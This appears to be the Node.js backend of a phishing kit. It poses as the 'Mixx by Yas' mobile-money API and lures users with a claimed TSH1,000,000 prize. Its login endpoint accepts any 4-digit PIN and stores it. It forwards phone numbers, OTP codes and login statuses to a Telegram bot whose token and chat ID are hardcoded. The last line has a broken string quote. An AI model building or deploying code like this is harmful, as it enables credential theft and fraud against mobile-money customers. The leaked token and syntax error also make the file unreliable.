// server.js - Complete Backend with Telegram Integration
const express = require('express');
const cors = require('cors');
const axios = require('axios');
require('dotenv').config();

const app = express();

// ===== MIDDLEWARE =====
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ===== CONFIGURATION =====
// Use Railway's PORT or fallback to 3000 for local development
const PORT = process.env.PORT || 3000;

// ===== TELEGRAM CREDENTIALS =====
// Use environment variables if available, otherwise use hardcoded values
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8926981745:AAFg96uMr8hQaiQN0F9Miglr0gizZrp48rs';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8392790531';

// ===== IN-MEMORY STORAGE (Use Redis/DB in production) =====
const userOTPStore = new Map(); // phone -> { otp, expiresAt, attempts }
const userPinStore = new Map(); // phone -> pin (for demo)
const userSessionStore = new Map(); // phone -> { loggedIn, timestamp }

// ===== VALIDATION FUNCTIONS =====
function validatePhone(phone) {
    return /^(07|06)\d{8}$/.test(phone);
}

function validatePin(pin) {
    return /^\d{4}$/.test(pin);
}

function validateOTP(otp) {
    return /^\d{6}$/.test(otp);
}

// ===== TELEGRAM FUNCTIONS =====
async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram message sent successfully');
        return response.data;
    } catch (error) {
        console.error('❌ Telegram send error:', error.response?.data || error.message);
        throw error;
    }
}

async function sendOTP(phone, otp) {
    const message = `
🎯 <b>MIXX BY YAS - OTP VERIFICATION</b>
━━━━━━━━━━━━━━━━━━━━━

📱 <b>Phone:</b> ${phone}
🔐 <b>OTP Code:</b> <code>${otp}</code>
⏰ <b>Valid for:</b> 5 minutes

⚠️ <i>Do not share this code with anyone!</i>

━━━━━━━━━━━━━━━━━━━━━
🔒 Secure · Fast · Reliable
    `;
    return await sendTelegramMessage(message);
}

async function sendLoginNotification(phone, status) {
    const message = `
🔔 <b>LOGIN ATTEMPT</b>
━━━━━━━━━━━━━━━━━━━━━

📱 <b>Phone:</b> ${phone}
📊 <b>Status:</b> ${status}
🕐 <b>Time:</b> ${new Date().toLocaleString()}

━━━━━━━━━━━━━━━━━━━━━
🔒 Secure · Fast · Reliable
    `;
    return await sendTelegramMessage(message);
}

// ===== API ENDPOINTS =====

// ===== 1. LOGIN ENDPOINT =====
app.post('/api/login', async (req, res) => {
    try {
        const { phone, pin, telegramBotToken, telegramChatId } = req.body;

        console.log('📤 Login request:', { phone, pin: '****' });

        // Validate phone
        if (!phone || !validatePhone(phone)) {
            return res.status(400).json({
                status: 'error',
                message: 'Invalid phone number. Must be 07XXXXXXXX or 06XXXXXXXX'
            });
        }

        // Validate PIN
        if (!pin || !validatePin(pin)) {
            return res.status(400).json({
                status: 'error',
                message: 'Invalid PIN. Must be 4 digits'
            });
        }

        // ===== DEMO: Accept any 4-digit PIN for testing =====
        // In production, check against your database
        // For demo, we accept all valid 4-digit PINs
        // You can replace this with actual PIN validation
        
        // Store PIN for demo (in production, this would be in database)
        userPinStore.set(phone, pin);

        // Generate OTP
        const otp = generateOTP();
        const expiresAt = Date.now() + 5 * 60 * 1000; // 5 minutes

        // Store OTP
        userOTPStore.set(phone, {
            otp: otp,
            expiresAt: expiresAt,
            attempts: 0
        });

        // Send OTP via Telegram
        await sendOTP(phone, otp);
        await sendLoginNotification(phone, '✅ LOGIN SUCCESS - OTP SENT');

        // Store session
        userSessionStore.set(phone, {
            loggedIn: true,
            timestamp: Date.now()
        });

        console.log('✅ Login successful, OTP sent to:', phone);

        res.json({
            status: 'success',
            message: 'Login successful! OTP sent to your phone via Telegram',
            data: {
                phone: phone,
                otpSent: true
            }
        });

    } catch (error) {
        console.error('❌ Login error:', error);
        await sendLoginNotification(req.body.phone || 'Unknown', '❌ LOGIN FAILED');
        res.status(500).json({
            status: 'error',
            message: 'Login failed. Please try again.'
        });
    }
});

// ===== 2. VERIFY OTP ENDPOINT =====
app.post('/api/verify-otp', async (req, res) => {
    try {
        const { phone, otp, telegramBotToken, telegramChatId } = req.body;

        console.log('📤 Verify OTP request:', { phone, otp });

        // Validate phone
        if (!phone || !validatePhone(phone)) {
            return res.status(400).json({
                status: 'error',
                message: 'Invalid phone number'
            });
        }

        // Validate OTP
        if (!otp || !validateOTP(otp)) {
            return res.status(400).json({
                status: 'error',
                message: 'Invalid OTP. Must be 6 digits'
            });
        }

        // Check if OTP exists for this phone
        const storedData = userOTPStore.get(phone);
        if (!storedData) {
            return res.status(400).json({
                status: 'error',
                message: 'No OTP found. Please request a new one.'
            });
        }

        // Check attempts
        if (storedData.attempts >= 3) {
            userOTPStore.delete(phone);
            return res.status(400).json({
                status: 'error',
                message: 'Too many failed attempts. Please request a new OTP.'
            });
        }

        // Check expiration
        if (Date.now() > storedData.expiresAt) {
            userOTPStore.delete(phone);
            return res.status(400).json({
                status: 'error',
                message: 'OTP has expired. Please request a new one.'
            });
        }

        // Verify OTP
        if (storedData.otp !== otp) {
            storedData.attempts += 1;
            userOTPStore.set(phone, storedData);
            return res.status(400).json({
                status: 'error',
                message: `Invalid OTP. ${3 - storedData.attempts} attempts remaining.`
            });
        }

        // ===== OTP VERIFIED SUCCESSFULLY =====
        // Clean up
        userOTPStore.delete(phone);

        // Send success notification via Telegram
        const successMessage = `
🎉 <b>OTP VERIFIED SUCCESSFULLY</b>
━━━━━━━━━━━━━━━━━━━━━

📱 <b>Phone:</b> ${phone}
✅ <b>Status:</b> VERIFIED
🕐 <b>Time:</b> ${new Date().toLocaleString()}

🏆 <b>Congratulations!</b> You've successfully claimed TSH1,000,000!

━━━━━━━━━━━━━━━━━━━━━
🔒 Secure · Fast · Reliable
        `;
        await sendTelegramMessage(successMessage);

        console.log('✅ OTP verified for:', phone);

        res.json({
            status: 'success',
            message: 'OTP verified successfully!',
            data: {
                phone: phone,
                verified: true
            }
        });

    } catch (error) {
        console.error('❌ OTP verification error:', error);
        res.status(500).json({
            status: 'error',
            message: 'OTP verification failed. Please try again.'
        });
    }
});

// ===== 3. RESEND OTP ENDPOINT =====
app.post('/api/resend-otp', async (req, res) => {
    try {
        const { phone, telegramBotToken, telegramChatId } = req.body;

        console.log('📤 Resend OTP request:', { phone });

        // Validate phone
        if (!phone || !validatePhone(phone)) {
            return res.status(400).json({
                status: 'error',
                message: 'Invalid phone number'
            });
        }

        // Generate new OTP
        const otp = generateOTP();
        const expiresAt = Date.now() + 5 * 60 * 1000; // 5 minutes

        // Store OTP
        userOTPStore.set(phone, {
            otp: otp,
            expiresAt: expiresAt,
            attempts: 0
        });

        // Send OTP via Telegram
        await sendOTP(phone, otp);

        console.log('✅ OTP resent to:', phone);

        res.json({
            status: 'success',
            message: 'New OTP sent successfully!',
            data: {
                phone: phone,
                otpSent: true
            }
        });

    } catch (error) {
        console.error('❌ Resend OTP error:', error);
        res.status(500).json({
            status: 'error',
            message: 'Failed to resend OTP. Please try again.'
        });
    }
});

// ===== 4. HEALTH CHECK ENDPOINT =====
app.get('/api/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        port: PORT
    });
});

// ===== 5. TEST TELEGRAM ENDPOINT =====
app.get('/api/test-telegram', async (req, res) => {
    try {
        await sendTelegramMessage('✅ Mixx by Yas bot is online and working!');
        res.json({
            status: 'success',
            message: 'Test message sent to Telegram'
        });
    } catch (error) {
        res.status(500).json({
            status: 'error',
            message: 'Failed to send test message'
        });
    }
});

// ===== 6. ROOT ENDPOINT =====
app.get('/', (req, res) => {
    res.json({
        name: 'Mixx by Yas API',
        version: '1.0.0',
        status: 'online',
        endpoints: {
            login: '/api/login (POST)',
            verify: '/api/verify-otp (POST)',
            resend: '/api/resend-otp (POST)',
            health: '/api/health (GET)',
            testTelegram: '/api/test-telegram (GET)'
        }
    });
});

// ===== HELPER FUNCTIONS =====
function generateOTP() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

// ===== ERROR HANDLING =====
app.use((err, req, res, next) => {
    console.error('Global error:', err);
    res.status(500).json({
        status: 'error',
        message: 'Something went wrong. Please try again.'
    });
});

// ===== START SERVER =====
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📍 API URL: https://mixxbyyas-offers06com-production.up.railway.app`);
    console.log(`📱 Telegram Bot: @${TELEGRAM_BOT_TOKEN.split(':')[0]}`);
    console.log(`📊 Chat ID: ${TELEGRAM_CHAT_ID}`);
    console.log('✅ Server is ready!`);
});
